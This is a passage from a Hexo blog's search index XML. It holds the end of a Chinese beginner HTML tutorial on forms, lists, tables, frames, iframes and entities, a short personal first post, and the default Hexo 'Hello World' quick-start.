type=&quot;radio&quot; name=&quot;c&quot; checked=&quot;checked&quot;/&gt;女&lt;br/&gt;&lt;br/&gt;&lt;!--下拉框/（标签）select    选项给浏览者看的    给计算机看的是value中的值--&gt;&lt;select&gt;    &lt;option&gt;--请选择--&lt;/option&gt;    &lt;option value=&quot;1&quot;&gt;葡萄&lt;/option&gt;    &lt;option value=&quot;橘子&quot;&gt;橘子&lt;/option&gt;    &lt;option&gt;香蕉&lt;/option&gt;    &lt;option&gt;柠檬&lt;/option&gt;    &lt;option&gt;香水&lt;/option&gt;&lt;/select&gt;&lt;br/&gt;&lt;br/&gt;&lt;!--文本域textarea    rows：行数（即高度）    cols：列数（即宽度）--&gt;&lt;textarea rows=&quot;1&quot; cols=&quot;50&quot;&gt;    你是朵夜云，在我梦幻的天空浮泛&lt;/textarea&gt;&lt;br/&gt;&lt;br/&gt;&lt;!--上传标签file--&gt;&lt;input type=&quot;file&quot;&gt;&lt;br/&gt;&lt;br/&gt;</code></pre><p>15：u标签</p><!--15：u标签--><pre><code>&lt;ul&gt;    &lt;li&gt;john&lt;/li&gt;    &lt;li&gt;yohn&lt;/li&gt;    &lt;li&gt;smith&lt;/li&gt;&lt;/ul&gt;&lt;br/&gt;&lt;br/&gt;&lt;ul type=&quot;circle&quot;&gt;    &lt;li&gt;john&lt;/li&gt;    &lt;li&gt;yohn&lt;/li&gt;    &lt;li&gt;smith&lt;/li&gt;&lt;/ul&gt;&lt;br/&gt;&lt;br/&gt;&lt;ul type=&quot;disc&quot;&gt;    &lt;li&gt;john&lt;/li&gt;    &lt;li&gt;yohn&lt;/li&gt;    &lt;li&gt;smith&lt;/li&gt;&lt;/ul&gt;&lt;br/&gt;&lt;br/&gt;</code></pre><p>16：table（表格）标签</p><!--16：table（表格）标签        table：（桌子）、表格        border：边框（像素为1？）        thead：表格头        tr：表格行        th：表格头中的列        td：表格列        colspan：标签属性（合并列《跨列数》）数字为合并的列数        rowspan：合并行（跨行数）        align：对齐        提示：外层标签（head、body、foot）可以不要，效果一样    --><pre><code>&lt;table border=&quot;1&quot;&gt;    &lt;thead&gt;        &lt;tr&gt;            &lt;th colspan=&quot;2&quot; align=&quot;center&quot;&gt;理想与现实的距离&lt;/td&gt;        &lt;/tr&gt;            &lt;/thead&gt;    &lt;tbody&gt;        &lt;tr&gt;            &lt;th&gt;理想&lt;/th&gt;            &lt;th&gt;当下&lt;/th&gt;        &lt;/tr&gt;        &lt;tr&gt;            &lt;td&gt;距离&lt;/td&gt;            &lt;td&gt;little&lt;/td&gt;        &lt;/tr&gt;        &lt;tr&gt;            &lt;td&gt;时间&lt;/td&gt;            &lt;td&gt;little&lt;/td&gt;        &lt;/tr&gt;    &lt;/tbody&gt;    &lt;tfoot&gt;        &lt;tr&gt;            &lt;td&gt;求和&lt;/td&gt;            &lt;td&gt;max&lt;/td&gt;        &lt;/tr&gt;    &lt;/tfoot&gt;</code></pre><p>17:frameset（框架页）标签<br><!doctype html></p><!--文档类型声明 html--><html><!--17：frameset标签        frameset:n.框架型 框架的 框架页 框架集        frame：n. 框架，边框；    --><!----混合框架----><frameset rows="50%,50%">    <frame src="frame框架1.html"></frame>    <frameset cols="50%,50%">        <frame src="frame框架2.html"></frame>        <frame src="frame框架3.html"></frame>    </frameset></frameset></html>18：iframe（n. 内嵌框架；内联框架）标签<!--        18：iframe（n. 内嵌框架；内联框架）标签        作用：在当前页面中嵌套        src中可以是：图片、html、网址等....        1:vh就是当前屏幕可见高度的1%，也就是说        height:100vh == height:100%;        2:vw就是当前屏幕宽度的1%        3:scorlling:n、v：滚动、卷动<pre><code>    注意：一些老的浏览器不支持iframe            如果得不到支持，iframe是不可见的--&gt;&lt;br/&gt;&lt;br/&gt;    &lt;iframe src=&quot;https://www.4399.com/&quot; style=&quot;width: 100vw; height:100vh&quot; frameborder=&quot;0&quot; scorlling=&quot;no&quot;&gt;&lt;/iframe&gt;&lt;!--    &lt;iframe src=&quot;https://www.baidu.com&quot; style=&quot;width: 100vw; height:100vh frameborder=&quot;0&quot; scorlling=&quot;no&quot;;&gt;&lt;/iframe&gt;    这个网站不能嵌入，尚未解决（请求被拒绝）--&gt;我在iframe之外奥&lt;br/&gt;&lt;br/&gt;</code></pre><p>19:属性<br> <!--        19:属性        每一个html标签，都有自己的属性，通过设置属性的值，达到想要的外观或功能性效果        当然，也可以在标签上通过name="value"的方式写自定义的属性，以共自己调用        常见的属性；        width、height、id（唯一,相当于给每一个标签起唯一的一个标识）、name（可相同）、        src（img、iframe等标签中）、value（值）、type、align（文本对齐方式）    --><br>20:hr标签（横线）</p><!--        20:hr标签（横线）    --><pre><code>下面有一条横线&lt;hr&gt;滴&lt;hr&gt;上面也有一条横线&lt;br/&gt;&lt;br/&gt;</code></pre><p>21:html实体编码、转义、特殊符号</p><!--        21:html实体编码、转义、特殊符号    --><pre><code>M&lt;sup&gt;2&lt;/sup&gt;&lt;pre&gt;HTML特殊转义字符对照表&lt;/pre&gt;https://tool.oschina.net/commons?type=2&lt;pre&gt;HTML 中有用的字符实体&lt;/pre&gt;https://www.w3school.com.cn/html/html_entities.asp&lt;pre&gt;URL 编码参考手册&lt;/pre&gt;https://www.runoob.com/tags/html-urlencode.html&lt;pre&gt;URL 汉字转html实体符号 中文转&amp;#开头的字符编码&lt;/pre&gt;https://seo.juziseo.com/tools/entity/ html实体编码&lt;h1 style=&quot;color: lawngreen;&quot; align=&quot;center&quot;&gt;html see you soon&lt;/h1&gt;</code></pre><p>​</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>The first day</title>
      <link href="/2022/01/13/The-first-day/"/>
      <url>/2022/01/13/The-first-day/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>sticky: 1<br>copyright_author: Kanyun<br>copyright_info: 此文章版权归Kanyun所有，如有转载，请註明来自原作者<br>hello，我是KanYun，blog路漫漫，也算是来到了这一步，这是一个开始，希望对看到My blog的每一个朋友，它都能够陪你度过一段快乐的时光！！！</p><h2 id="今天就简单一点吧（还要去干饭哈哈）"><a href="#今天就简单一点吧（还要去干饭哈哈）" class="headerlink" title="今天就简单一点吧（还要去干饭哈哈）"></a>今天就简单一点吧（还要去干饭哈哈）</h2><p>红颜烤奶其实一般般（开启闪躲技能^__^haha）</p><p>还不会贴图片，否则少不了一张暴打小黑照片（气吧哈哈O(∩<em>∩)O@</em>@haha）<br><img src="The-first-day/hei.jpg" alt="hei"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>慢着，听首歌再溜！</p><p><a href="https://www.bilibili.com/video/BV1X44y1x7xu?from=search&amp;seid=14638848182898955938&amp;spm_id_from=333.337.0.0">https://www.bilibili.com/video/BV1X44y1x7xu?from=search&amp;seid=14638848182898955938&amp;spm_id_from=333.337.0.0</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/01/12/hello-world/"/>
      <url>/2022/01/12/hello-world/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
